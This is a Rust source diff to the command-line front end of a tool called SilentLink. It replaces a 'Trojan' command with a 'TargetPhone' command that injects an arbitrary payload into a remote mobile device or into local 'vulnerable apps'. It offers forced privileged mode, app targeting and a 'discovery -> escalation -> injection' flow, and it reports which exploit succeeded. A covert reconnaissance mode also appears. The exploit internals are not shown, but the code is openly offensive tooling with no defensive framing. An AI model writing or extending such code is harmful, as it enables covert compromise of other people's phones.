@@ -1,3 +1,5 @@
+#![allow(unused_variables)]
+
 use std::path::PathBuf;
 use std::sync::Arc;
 use std::time::Duration;
@@ -71,13 +73,22 @@ pub enum Commands {
     /// Covert reconnaissance mode
     Recon,
     
-    /// Send message via trojan injection
-    Trojan {
-        #[arg(help = "Message content")]
-        message: String,
+    /// Target mobile device with payload injection
+    TargetPhone {
+        #[arg(help = "Payload to inject")]
+        payload: String,
         
-        #[arg(long, help = "Target device ID (optional)")]
+        #[arg(long, help = "Target device ID or IP address")]
         target: Option<String>,
+        
+        #[arg(long, help = "Target specific apps (comma-separated)")]
+        apps: Option<String>,
+        
+        #[arg(long, help = "Force privileged mode")]
+        privileged: bool,
+        
+        #[arg(long, help = "Platform: android, ios, or auto-detect", default_value = "android")]
+        platform: String,
     },
     
     /// Emergency broadcast via all vectors
@@ -133,7 +144,7 @@ pub async fn run_cli() -> Result<()> {
 
             silentlink.start().await?;
             
-            info!("✅ SilentLink started. Press Ctrl+C to stop.");
+            info!("SilentLink started. Press Ctrl+C to stop.");
             
             // Wait for Ctrl+C
             tokio::signal::ctrl_c().await.map_err(|e| SilentLinkError::System(e.to_string()))?;
@@ -219,7 +230,7 @@ pub async fn run_cli() -> Result<()> {
             sleep(Duration::from_secs(2)).await;
             
             let ping_id = silentlink.ping_device(target_device.clone()).await?;
-            info!("🏓 Ping sent to {} (ID: {})", target_device, ping_id);
+            info!("Ping sent to {} (ID: {})", target_device, ping_id);
             
             // Wait for response
             sleep(Duration::from_secs(5)).await;
@@ -230,30 +241,62 @@ pub async fn run_cli() -> Result<()> {
             let silentlink = Arc::new(SilentLink::new(Some(config)).await?);
             silentlink.start().await?;
             
-            info!("🕵️ Starting covert reconnaissance...");
+            info!("Starting covert reconnaissance...");
             silentlink.reconnaissance_mode().await?;
             
             sleep(Duration::from_secs(3)).await;
             silentlink.stop().await?;
         }
         
-        Commands::Trojan { message, target } => {
-            let silentlink = Arc::new(SilentLink::new(Some(config)).await?);
+        Commands::TargetPhone { payload, target, apps: _, privileged, platform } => {
+            info!("Targeting mobile device with payload injection");
+            
+            // Create config with privileged mode if requested
+            let mut target_config = config.clone();
+            target_config.enable_privileged_mode = privileged;
+            
+            let silentlink = Arc::new(SilentLink::new(Some(target_config)).await?);
             silentlink.start().await?;
             
-            let target_device = if let Some(target_str) = target {
-                let target_uuid = Uuid::parse_str(&target_str)
-                    .map_err(|_| SilentLinkError::System("Invalid target device ID".to_string()))?;
-                Some(DeviceId(target_uuid))
-            } else {
-                None
-            };
-            
-            info!("Attempting trojan-style message delivery...");
-            let message_id = silentlink.send_via_trojan(message, target_device).await?;
-            info!("Trojan message sent with ID: {}", message_id);
-            
+            // Wait for ultrasonic discovery and transport initialization
+            info!("Initializing discovery systems...");
             sleep(Duration::from_secs(3)).await;
+            
+            if let Some(target_str) = target {
+                // Try to parse as device ID first
+                let target_device = if let Ok(target_uuid) = Uuid::parse_str(&target_str) {
+                    Some(DeviceId(target_uuid))
+                } else {
+                    info!("Target appears to be IP address or name: {}", target_str);
+                    // In real implementation, would resolve IP to device ID via network discovery
+                    None
+                };
+                
+                // Use the enhanced delivery system (discovery -> escalation -> injection)
+                let message_id = silentlink.send_message(payload, target_device).await?;
+                info!("Payload delivery attempted via enhanced flow - message ID: {}", message_id);
+                
+            } else {
+                // No specific target - inject payload into local vulnerable apps
+                info!("No target specified - attempting local payload injection");
+                let injection_results = silentlink.inject_payload_to_apps(payload.as_bytes()).await?;
+                
+                println!("📊 Injection Results:");
+                for result in &injection_results {
+                    let status = if result.success { "SUCCESS" } else { "FAILED" };
+                    println!("  {} - {}: {} ({})", status, result.app_name, result.exploit_used, result.message);
+                }
+                
+                let successful_injections = injection_results.iter().filter(|r| r.success).count();
+                println!("\n🎯 Summary: {}/{} injections successful", successful_injections, injection_results.len());
+                
+                if successful_injections == 0 {
+                    println!("💡 Try running with --privileged flag for enhanced capabilities");
+                    println!("💡 Or specify --target <DEVICE_ID> to target a remote device");
+                }
+            }
+            
+            sleep(Duration::from_secs(2)).await;
             silentlink.stop().await?;
         }
         
